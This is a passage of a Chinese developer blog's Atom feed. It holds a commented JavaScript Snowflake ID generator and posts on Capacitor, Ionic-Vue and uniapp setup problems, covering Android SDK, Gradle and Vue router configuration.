class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"> * 网上搜到的方案基本是按照推特的方案（10位的数据机器位分成 5位机器ID + 5位数据ID ），目前代码按照这个方案来做的；</span><br><span class="line"> * 代码是参考网上的一个 Java 版本的实现方案：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;relucent&#x2F;p&#x2F;4955340.html 编写的，</span><br><span class="line"> * 这个Java方案的实现是参考：https:&#x2F;&#x2F;github.com&#x2F;twitter-archive&#x2F;snowflake</span><br><span class="line"> *</span><br><span class="line"> * 名词说明：</span><br><span class="line"> * Twitter_Snowflake</span><br><span class="line"> * SnowFlake的结构如下(每部分用-分开):</span><br><span class="line"> *</span><br><span class="line"> * 0 - 0000000000 0000000000 0000000000 0000000000 0 - 00000 - 00000 - 000000000000</span><br><span class="line"> * A-|--------------------B--------------------------|-------C-------|------D------|</span><br><span class="line"> *</span><br><span class="line"> * A区：1位标识，由于long基本类型在Java中是带符号的，最高位是符号位，正数是0，负数是1，所以id一般是正数，最高位是0</span><br><span class="line"> * B区：41位时间截(毫秒级)，注意，41位时间截不是存储当前时间的时间截，而是存储时间截的差值（当前时间截 - 开始时间截)得到的值，</span><br><span class="line"> *      这里的的开始时间截，一般是我们的id生成器开始使用的时间，由我们程序来指定的（如下下面程序IdWorker类的startTime属性）。41位的时间截，可以使用69年，</span><br><span class="line"> *      年T &#x3D; (1n &lt;&lt; 41n) &#x2F; (1000n * 60n * 60n * 24n * 365n) &#x3D; 69n</span><br><span class="line"> * C区：10位的数据机器位，可以部署在1024个节点，包括5位datacenterId和5位workerId（2^5 * 2^5 &#x3D; 1024）</span><br><span class="line"> * D区：12位序列，毫秒内的计数，12位 的计数顺序号支持每个节点每毫秒(同一机器，同一时间截)产生4096个ID序号（2^12&#x3D;4096）</span><br><span class="line"> * 加起来刚好64位，为一个Long型。</span><br><span class="line"> *</span><br><span class="line"> * SnowFlake的优点是，整体上按照时间自增排序，并且整个分布式系统内不会产生ID碰撞(由数据ID和机器ID作区分)，并且效率较高。</span><br><span class="line"> * 理论1S内生成的ID数量是 1000*4096 &#x3D; 4096000（四百零九万六千个）</span><br><span class="line"> * 代码中使用Bigint实现，该类型在Node10.X版本才开始支持，返回出去的结果是Bigint转为String后的字符串类型，toString方法消耗总性能的三分之一时间；</span><br><span class="line"> * 性能测试结果：</span><br><span class="line"> *      生成100W条ID，      约850-1000ms；  如果不toString后再转，  时间约 640-660ms</span><br><span class="line"> *      生成409.6WW条ID，   约3600-3850ms； 如果不toString后再转，  时间约约 2600-2800ms</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Constructors&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;**</span><br><span class="line"> * 构造函数</span><br><span class="line"> * @param workerId 工作ID (0~31)</span><br><span class="line"> * @param datacenterId 数据标识ID (0~31)</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">const Snowflake &#x3D; (function () &#123;</span><br><span class="line">  function Snowflake (_workerId, _dataCenterId) &#123;</span><br><span class="line">    &#x2F;** 开始时间截 ：2019-12-20 13:52:35 *&#x2F;</span><br><span class="line">    this.twepoch &#x3D; 1576821155667n</span><br><span class="line"></span><br><span class="line">    &#x2F;** 机器id所占的位数 *&#x2F;</span><br><span class="line">    this.workerIdBits &#x3D; 5n</span><br><span class="line"></span><br><span class="line">    &#x2F;** 数据标识id所占的位数 *&#x2F;</span><br><span class="line">    this.dataCenterIdBits &#x3D; 5n</span><br><span class="line"></span><br><span class="line">    &#x2F;**</span><br><span class="line">     * 支持的最大机器id，结果是31 (这个移位算法可以很快的计算出几位二进制数所能表示的最大十进制数)</span><br><span class="line">     * 用位运算计算n个bit能表示的最大数值，计算是 -1 左移 5，得结果a，然后 -1 异或 a</span><br><span class="line">     *</span><br><span class="line">     * 步骤</span><br><span class="line">     * 先 -1 左移 5，得结果a ：</span><br><span class="line">     11111111 11111111 11111111 11111111 &#x2F;&#x2F;-1的二进制表示（补码，补码的意义是拿补码和原码相加，最终加出一个“溢出的0”）</span><br><span class="line">     11111 11111111 11111111 11111111 11100000 &#x2F;&#x2F;高位溢出的不要，低位补0</span><br><span class="line">     11111111 11111111 11111111 11100000 &#x2F;&#x2F;结果a</span><br><span class="line">     * 再 -1 异或 a ：</span><br><span class="line">     11111111 11111111 11111111 11111111 &#x2F;&#x2F;-1的二进制表示（补码）</span><br><span class="line">     ^   11111111 11111111 11111111 11100000 &#x2F;&#x2F;两个操作数的位中，相同则为0，不同则为1</span><br><span class="line">     ---------------------------------------------------------------------------</span><br><span class="line">     00000000 00000000 00000000 00011111 &#x2F;&#x2F;最终结果31</span><br><span class="line">     * *&#x2F;</span><br><span class="line">    this.maxWrokerId &#x3D; -1n ^ (-1n &lt;&lt; this.workerIdBits) &#x2F;&#x2F; 值为：31</span><br><span class="line"></span><br><span class="line">    &#x2F;** 支持的最大数据标识id，结果是31 *&#x2F;</span><br><span class="line">    this.maxDataCenterId &#x3D; -1n ^ (-1n &lt;&lt; this.dataCenterIdBits) &#x2F;&#x2F; 值为：31</span><br><span class="line"></span><br><span class="line">    &#x2F;** 序列在id中占的位数 *&#x2F;</span><br><span class="line">    this.sequenceBits &#x3D; 12n</span><br><span class="line"></span><br><span class="line">    &#x2F;** 机器ID向左移12位 *&#x2F;</span><br><span class="line">    this.workerIdShift &#x3D; this.sequenceBits &#x2F;&#x2F; 值为：12</span><br><span class="line"></span><br><span class="line">    &#x2F;** 数据标识id向左移17位(12序列id+5机器ID) *&#x2F;</span><br><span class="line">    this.dataCenterIdShift &#x3D; this.sequenceBits + this.workerIdBits &#x2F;&#x2F; 值为：17</span><br><span class="line"></span><br><span class="line">    &#x2F;** 时间截向左移22位( 12序列id + 5机器ID + 5数据ID) *&#x2F;</span><br><span class="line">    this.timestampLeftShift &#x3D; this.sequenceBits + this.workerIdBits + this.dataCenterIdBits &#x2F;&#x2F; 值为：22</span><br><span class="line"></span><br><span class="line">    &#x2F;** 生成序列的掩码，这里为4095</span><br><span class="line">     * 用位运算计算n个bit能表示的最大数值，计算是 -1 左移 12，得结果a，然后 -1 异或 a</span><br><span class="line">     *</span><br><span class="line">     * 步骤</span><br><span class="line">     * 先 -1 左移 12，得结果a ：</span><br><span class="line">     11111111 11111111 11111111 11111111 &#x2F;&#x2F;-1的二进制表示（补码，补码的意义是拿补码和原码相加，最终加出一个“溢出的0”）</span><br><span class="line">     1111 11111111 11111111 11111111 11110000 00000000 &#x2F;&#x2F;高位溢出的不要，低位补0</span><br><span class="line">     11111111 11111111 11110000 00000000 &#x2F;&#x2F;结果a</span><br><span class="line">     * 再 -1 异或 a ：</span><br><span class="line">     11111111 11111111 11111111 11111111 &#x2F;&#x2F;-1的二进制表示（补码）</span><br><span class="line">     ^   11111111 11111111 11110000 00000000 &#x2F;&#x2F;两个操作数的位中，相同则为0，不同则为1</span><br><span class="line">     ---------------------------------------------------------------------------</span><br><span class="line">     00000000 00000000 00001111 11111111 &#x2F;&#x2F;最终结果2^12  &#x3D; 4096</span><br><span class="line">     *&#x2F;</span><br><span class="line">    this.sequenceMask &#x3D; -1n ^ (-1n &lt;&lt; this.sequenceBits) &#x2F;&#x2F; 值为：4095</span><br><span class="line"></span><br><span class="line">    &#x2F;** 工作机器ID(0~31) *&#x2F;</span><br><span class="line">    &#x2F;&#x2F; this.workerId &#x3D; 0n</span><br><span class="line">    &#x2F;** 数据中心ID(0~31) *&#x2F;</span><br><span class="line">    &#x2F;&#x2F; this.dataCenterId &#x3D; 0n</span><br><span class="line"></span><br><span class="line">    &#x2F;** 上次生成ID的时间截 *&#x2F;</span><br><span class="line">    this.lastTimestamp &#x3D; -1n</span><br><span class="line"></span><br><span class="line">    this.workerId &#x3D; BigInt(_workerId || 0n) &#x2F;&#x2F; 工作机器ID(0~31)</span><br><span class="line">    this.dataCenterId &#x3D; BigInt(_dataCenterId || 0n) &#x2F;&#x2F; 数据标识ID(0~31)</span><br><span class="line">    this.sequence &#x3D; 0n &#x2F;&#x2F; 毫秒内序列(0~4095)</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; workerId 校验</span><br><span class="line">    if (this.workerId &gt; this.maxWrokerId || this.workerId &lt; 0) &#123;</span><br><span class="line">      throw new Error(&#96;workerId must max than 0 and small than maxWrokerId $&#123;this.maxWrokerId&#125;&#96;)</span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F; dataCenterId 校验</span><br><span class="line">    if (this.dataCenterId &gt; this.maxDataCenterId || this.dataCenterId &lt; 0) &#123;</span><br><span class="line">      throw new Error(&#96;dataCenterId must max than 0 and small than maxDataCenterId $&#123;this.maxDataCenterId&#125;&#96;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  &#x2F;&#x2F; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;Methods&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">  &#x2F;**</span><br><span class="line">   * 获得下一个ID (该方法是线程安全的)</span><br><span class="line">   * @return SnowflakeId</span><br><span class="line">   *&#x2F;</span><br><span class="line">  Snowflake.prototype.nextId &#x3D; function () &#123;</span><br><span class="line">    let timestamp &#x3D; this.timeGen()</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 如果当前时间小于上一次ID生成的时间戳，说明系统时钟回退过这个时候应当抛出异常</span><br><span class="line">    if (timestamp &lt; this.lastTimestamp) &#123;</span><br><span class="line">      throw new Error(&#39;Clock moved backwards. Refusing to generate id for &#39; +</span><br><span class="line">        (this.lastTimestamp - timestamp))</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 如果是同一时间生成的，则进行毫秒内序列</span><br><span class="line">    if (this.lastTimestamp &#x3D;&#x3D;&#x3D; timestamp) &#123;</span><br><span class="line">      &#x2F;**</span><br><span class="line">       * 按位于操作 对于每一个比特位，只有两个操作数相应的比特位都是1时，结果才为1，否则为0。</span><br><span class="line">       * 假设最开始 this.sequence 为 0n 加1后，则为1</span><br><span class="line">       * 结果如下</span><br><span class="line">       00000000 00000000 00000000 00000001 &#x2F;&#x2F;1的二进制</span><br><span class="line">       00000000 00000000 00001111 11111111 &#x2F;&#x2F;最终结果2^12  &#x3D; 4096</span><br><span class="line">       ---------------------------------------------------------------------------</span><br><span class="line">       00000000 00000000 00000000 00000001 &#x2F;&#x2F;结果1的二进制</span><br><span class="line">       *&#x2F;</span><br><span class="line">      this.sequence &#x3D; (this.sequence + 1n) &amp; this.sequenceMask</span><br><span class="line">      &#x2F;&#x2F; 毫秒内序列溢出</span><br><span class="line">      if (this.sequence &#x3D;&#x3D;&#x3D; 0n) &#123;</span><br><span class="line">        &#x2F;&#x2F; 阻塞到下一个毫秒,获得新的时间戳</span><br><span class="line">        timestamp &#x3D; this.tilNextMillis(this.lastTimestamp)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      &#x2F;&#x2F; 时间戳改变，毫秒内序列重置</span><br><span class="line">      this.sequence &#x3D; 0n</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 上次生成ID的时间截</span><br><span class="line">    this.lastTimestamp &#x3D; timestamp</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F; 移位并通过或运算拼到一起组成64位的ID</span><br><span class="line">    const result &#x3D; ((timestamp - this.twepoch) &lt;&lt; this.timestampLeftShift) |</span><br><span class="line">      (this.dataCenterId &lt;&lt; this.dataCenterIdShift) |</span><br><span class="line">      (this.workerId &lt;&lt; this.workerIdShift) |</span><br><span class="line">      this.sequence</span><br><span class="line">    return result</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;**</span><br><span class="line">   * 阻塞到下一个毫秒，直到获得新的时间戳</span><br><span class="line">   * @param lastTimestamp 上次生成ID的时间截</span><br><span class="line">   * @return 当前时间戳</span><br><span class="line">   *&#x2F;</span><br><span class="line">  Snowflake.prototype.tilNextMillis &#x3D; function (lastTimestamp) &#123;</span><br><span class="line">    let timestamp &#x3D; this.timeGen()</span><br><span class="line">    while (timestamp &lt;&#x3D; lastTimestamp) &#123;</span><br><span class="line">      timestamp &#x3D; this.timeGen()</span><br><span class="line">    &#125;</span><br><span class="line">    return timestamp</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;**</span><br><span class="line">   * 返回以毫秒为单位的当前时间</span><br><span class="line">   * @return 当前时间(毫秒)</span><br><span class="line">   *&#x2F;</span><br><span class="line">  Snowflake.prototype.timeGen &#x3D; function () &#123;</span><br><span class="line">    return BigInt(Date.now())</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return Snowflake</span><br><span class="line">&#125;())</span><br><span class="line">&#x2F;&#x2F; console.log(new Snowflake(1n, 1n).nextId());</span><br><span class="line">module.exports &#x3D; Snowflake</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;axios集成封装&quot;&gt;&lt;a href=&quot;#axios集成封装&quot; class=&quot;headerlink&quot; title=&quot;axios集成封装&quot;&gt;&lt;/a&gt;axios集成封装&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;在&lt;code&gt;nuxt.config.js&lt;/code&gt;中配置&lt;code</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    <category term="Nuxtjs" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/Nuxtjs/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="性能测试" scheme="https://seniortesting.club/tags/%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>uniapp开发技巧和问题整理</title>
    <link href="https://seniortesting.club/posts/ABcgzNQDz0/"/>
    <id>https://seniortesting.club/posts/ABcgzNQDz0/</id>
    <published>2021-03-25T15:16:52.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    <category term="Uniapp" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/Uniapp/"/>
    
    
  </entry>
  
  <entry>
    <title>Capacitor入门学习</title>
    <link href="https://seniortesting.club/posts/J63hSXFqXH/"/>
    <id>https://seniortesting.club/posts/J63hSXFqXH/</id>
    <published>2021-03-25T15:16:52.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="新技术"><a href="#新技术" class="headerlink" title="新技术"></a>新技术</h2><ul><li><p>基于JavaScript的web端流程图：<a href="https://gojs.net/latest/samples/flowchart.html" target="_blank" rel="noopener">flowchart</a></p></li><li><p>无意搜到一个博客: <a href="https://www.finen.top/" target="_blank" rel="noopener">https://www.finen.top</a>,采用了vuepress为平台，代码托管在： <a href="https://github.com/hirCodd/vuepress-blog" target="_blank" rel="noopener">https://github.com/hirCodd/vuepress-blog</a></p></li><li><p>整理了一个<code>ionic-vue</code>的项目，可以访问demo地址: <a href="https://seniortesting.club/ionic-vue">ionic-vue</a></p></li></ul><h2 id="vuepress主题修改"><a href="#vuepress主题修改" class="headerlink" title="vuepress主题修改"></a>vuepress主题修改</h2><ul><li>基本上面的评论由<code>&quot;@vssue/vuepress-plugin-vssue</code>转为<code>valine</code>,有时间再弄。。。 ,参考一个优秀的博客主题定制： <a href="https://www.unaxu.com/blog/posts/005-one-how-to-generate-static-blog-with-vuepress.html" target="_blank" rel="noopener">vuepress 博客主题定制</a></li></ul><h2 id="Capacitor-初探"><a href="#Capacitor-初探" class="headerlink" title="Capacitor 初探"></a>Capacitor 初探</h2><p>折腾到使用安卓，然后重新安装对应的android sdk 和模拟器镜像:(强迫症作祟。。。)</p><ol><li>下载sdk-windows.exe文件，然后运行SDK Manager下载： SDK Platform tool, SDK build tool,Android SDK Platform 28 ,Google Play Intel x86 Atom_64 System Image ，重新制作了一个<br>Android的镜像文件。打开idea配置相关的所有工具和update site信息：</li></ol><p><img src="./img/android-sdk.png" alt="android sdk windows配置信息"></p><p> ::: warining 镜像文件<br> 推荐安装不带Google Play的镜像，否则可能不能安装未知来源的apk文件,坑啊，千万不要使用<br> :::<br>2. 如下为对应的<code>capacitor.config.json</code>配置信息:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;appId&quot;</span>: <span class="string">&quot;com.github.app&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;appName&quot;</span>: <span class="string">&quot;com.github.vue-mobile&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;bundledWebRuntime&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">&quot;webDir&quot;</span>: <span class="string">&quot;dist&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;npmClient&quot;</span>: <span class="string">&quot;yarn&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;windowsAndroidStudioPath&quot;</span>: <span class="string">&quot;E:\\Program Files\\JetBrains\\IntelliJ IDEA 2019.1\\bin\\idea64.exe&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;android&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;allowMixedContent&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;captureInput&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">&quot;webContentsDebuggingEnabled&quot;</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;ios&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;cordovaSwiftVersion&quot;</span>: <span class="string">&quot;3.2&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;minVersion&quot;</span>: <span class="string">&quot;10.3&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>capacitor中使用的Android SDK是Android SDK 27，不是最新的Android SDK 28, 所以这里使用Android 27的镜像，对应的是Android 8.1</li></ol><p>::: warning IDEA的SDK Manager和直接使用的Android SDK Manager<br>  使用了Android sdk manager后以前的Android sdk manager将不能直接通过双击 <code>sdk manager.exe</code> 打开,原因是idea 进行了相关的替换操作，<br>  参考： <a href="https://blog.csdn.net/wang295689649/article/details/60960953" target="_blank" rel="noopener">android SDK SDK Manager.exe 无法打开，一闪而过最终解决办法</a><br>  所以后面的新建镜像，还有下载SDK什么的都最好直接在IDEA 里面进行操作，不再使用Android SDK Manager<br>:::</p><ol start="4"><li>通过<code>this.$router.push()</code>访问子路由没有问题，但是通过刷新页面访问嵌套的子路由，总是报如下的错误:</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Uncaught SyntaxError: Unexpected token &lt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考错误: <a href="https://stackoverflow.com/questions/49276879/second-level-vue-route-throws-error-when-accessed-directly" target="_blank" rel="noopener">Uncaught SyntaxError: Unexpected token &lt;</a></p><p>原因分析： 仔细查看对应的html的文件，会发现所有的生成的js文件的路径为如下：<code>js/app.js</code>,实际上应该是: <code>/js/app.js</code>, 所以应该是对应的<code>vue.config.js</code>里面的<code>publicPath</code>设置出问题：<br><code>publicPath: process.env.NODE_ENV === &#39;development&#39; ? &#39;./&#39; : &#39;/&#39;,</code>, 注意我在这里设置的路径开发下是./ ,这个设置是因为在Vue Cli2中为了配置静态路径这样做的，现在的Vue Cli3不需要这样配置了，所以修改成: <code>publicPath: process.env.NODE_ENV === &#39;development&#39; ? &#39;/&#39; : &#39;/&#39;</code>.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;新技术&quot;&gt;&lt;a href=&quot;#新技术&quot; class=&quot;headerlink&quot; title=&quot;新技术&quot;&gt;&lt;/a&gt;新技术&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;基于JavaScript的web端流程图：&lt;a href=&quot;https://gojs.net/latest/sam</summary>
      
    
    
    
    <category term="软件开发" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/"/>
    
    <category term="前端技术" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/"/>
    
    <category term="JavaScript" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/"/>
    
    <category term="vue2" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/"/>
    
    <category term="ionic" scheme="https://seniortesting.club/categories/%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%91/%E5%89%8D%E7%AB%AF%E6%8A%80%E6%9C%AF/JavaScript/vue2/ionic/"/>
    
    
    <category term="vue" scheme="https://seniortesting.club/tags/vue/"/>
    
    <category term="java" scheme="https://seniortesting.club/tags/java/"/>
    
    <category term="javascript" scheme="https://seniortesting.club/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>ionic-vue入门到放弃</title>
    <link href="https://seniortesting.club/posts/mK36fgwu2P/"/>
    <id>https://seniortesting.club/posts/mK36fgwu2P/</id>
    <published>2021-03-25T15:16:52.000Z</published>
    <updated>2021-04-18T13:00:39.463Z</updated>
    
    <content type="html"><![CDATA[<h2 id="学习Ionic-Vue"><a href="#学习Ionic-Vue" class="headerlink" title="学习Ionic Vue"></a>学习Ionic Vue</h2><h2 id="capacitor搭建及其踩坑"><a href="#capacitor搭建及其踩坑" class="headerlink" title="capacitor搭建及其踩坑"></a>capacitor搭建及其踩坑</h2><ol><li>在<code>package.json</code>中加入以下四个必须的依赖，我就是因为稍加了一个<code>@capacitor/cli</code>导致<code>app</code>模块中的<code>compileSdkVersion</code>是27，而其他的模块更新的确实28，注意！！！ 如下配置:</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&quot;@capacitor/android&quot;: &quot;^1.0.0&quot;,</span><br><span class="line">&quot;@capacitor/core&quot;: &quot;^1.0.0&quot;,</span><br><span class="line">&quot;@capacitor/cli&quot;: &quot;^1.0.0&quot;,</span><br><span class="line">&quot;@capacitor/ios&quot;: &quot;^1.0.0&quot;,</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><p>配置相应的gradle环境，例如环境变量GRADlE_HOME,GRADLE_USER_HOME，配置idea中的<code>service directory path</code>为自定义的gradle路径，配置<code>capacitor root path/android/app/gradle/wrapper/gradle-wrapper.properties</code>,设置里面的<code>distributionUrl=https\://services.gradle.org/distributions/gradle-5.4.1-all.zip</code> 为自己的设置的目录。</p></li><li><p>直接编译报错<code>point to the same directory in the file system.Each module must have a unique path.</code> ，解决方法: 将项目android文件下的    ***.iml 文件删掉，重新导入编译即可</p></li><li><p>android sdk这里我们使用的<code>@capacitor/core</code>=1.0.0， 所以它支持的Androidsdk是28，所以我们记得配置Androidstudio 中sdk只有一个API 28版本的。</p></li><li><p><code>npx cap sync</code>是用户安装了新的cordova插件后更新同步新的插件到工程里面。而<code>npx cap copy</code>主要就是每次的web工程build后将对应的dist目录复制到对应的assets目录下面。</p></li><li><p><code>Android 